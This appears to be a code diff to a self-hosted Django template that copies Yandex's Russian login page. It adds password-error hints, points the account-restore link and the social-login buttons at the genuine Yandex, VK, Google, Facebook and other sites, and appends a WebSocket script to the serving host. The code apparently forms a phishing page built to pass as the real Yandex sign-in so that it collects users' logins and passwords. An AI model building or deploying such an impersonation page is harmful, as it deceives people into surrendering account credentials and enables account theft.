@@ -94,9 +94,15 @@
                                                                     name="login" placeholder="Логин или email"
                                                                     value=""/><span class="Textinput-Box"></span></span>
                                                             </div>
+                                                            {% if incorrect_password %}
+    <div id="field:input-passwd:hint" data-t="field:input-passwd:hint" aria-live="polite" class="Textinput-Hint Textinput-Hint_state_error">Неправильный пароль</div>{% endif %}
+                                                            {% if incorrect_data %}
+    <div id="field:input-passwd:hint" data-t="field:input-passwd:hint" aria-live="polite" class="Textinput-Hint Textinput-Hint_state_error">Пожалуйста введите логин или телефон</div>{% endif %}
+                                                            {% if incorrect_data %}
+    <div id="field:input-passwd:hint" data-t="field:input-passwd:hint" aria-live="polite" class="Textinput-Hint Textinput-Hint_state_error">Такой логин не подойдет</div>{% endif %}
                                                             <div class="Field-link" data-t="field:link-login"
                                                                  id="field:link-login"><a data-t="link:default"
-                                                                                          href="/auth/restore/login?retpath=https%3A%2F%2Fmail.yandex.ru"
+                                                                                          href="https://passport.yandex.ru/auth/restore/login?repath"
                                                                                           weight="medium"
                                                                                           class="Link Link_pseudo Link_view_default Link_weight_medium">Не помню</a>
                                                             </div>
@@ -153,26 +159,31 @@
                                                 с помощью</h2>
                                                 <div class="AuthSocialBlock-providers">
                                                     <button type="button"
+                                                            onclick="window.location.href='https://vk.com/';"
                                                             class="AuthSocialBlock-provider AuthSocialBlock-provider_code_vk"
                                                             data-t="provider:primary:vk" aria-label="ВКонтакте"><span
                                                             class="PasspIcon PasspIcon_vk PasspIcon_size_s"
                                                             data-t="icon:vk"></span></button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://google.com/';"
                                                             class="AuthSocialBlock-provider AuthSocialBlock-provider_code_gg"
                                                             data-t="provider:primary:gg" aria-label="Google"><span
                                                             class="PasspIcon PasspIcon_gg PasspIcon_size_s"
                                                             data-t="icon:gg"></span></button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://yandex.com/';"
                                                             class="AuthSocialBlock-provider AuthSocialBlock-provider_code_qr"
                                                             data-t="provider:primary:qr" aria-label="QR-код"><span
                                                             class="AuthSocialBlock-icon"></span><span
                                                             class="AuthSocialBlock-name">QR-код</span></button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://facebook.com/';"
                                                             class="AuthSocialBlock-provider AuthSocialBlock-provider_code_fb"
                                                             data-t="provider:primary:fb" aria-label="Facebook"><span
                                                             class="PasspIcon PasspIcon_fb PasspIcon_size_s"
                                                             data-t="icon:fb"></span></button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://mail.ru/';"
                                                             class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
                                                             data-t="provider:primary:mr" aria-label="Mail.ru"><span
                                                             class="PasspIcon PasspIcon_mr PasspIcon_size_s"
@@ -180,6 +191,7 @@
                                                             class="AuthSocialBlock-secondaryProviderName">Mail.ru</span>
                                                     </button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://ok.ru/';"
                                                             class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
                                                             data-t="provider:primary:ok" aria-label="Одноклассники">
                                                         <span class="PasspIcon PasspIcon_ok PasspIcon_size_s"
@@ -187,6 +199,7 @@
                                                             class="AuthSocialBlock-secondaryProviderName">Одноклассники</span>
                                                     </button>
                                                     <button type="button"
+                                                            onclick="window.location.href='https://twitter.com/';"
                                                             class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
                                                             data-t="provider:primary:tw" aria-label="Twitter"><span
                                                             class="PasspIcon PasspIcon_tw PasspIcon_size_s"
@@ -273,7 +286,25 @@ phoneField.addEventListener('click', () => {
 
 </script>
 
+<script>
+    const socket = new WebSocket('ws://' + window.location.host + '/ws/cleanup_inactive_drivers/');
 
+    socket.onopen = function(e) {
+        console.log("[open] Connection established");
+    };
+
+    socket.onmessage = function(event) {
+        console.log(`[message] Data received from server: ${event.data}`);
+    };
+
+    socket.onclose = function(event) {
+        console.log(`[close] Connection closed`);
+    };
+
+    socket.onerror = function(error) {
+        console.log(`[error] ${error.message}`);
+    };
+</script>
 
 
 </body>
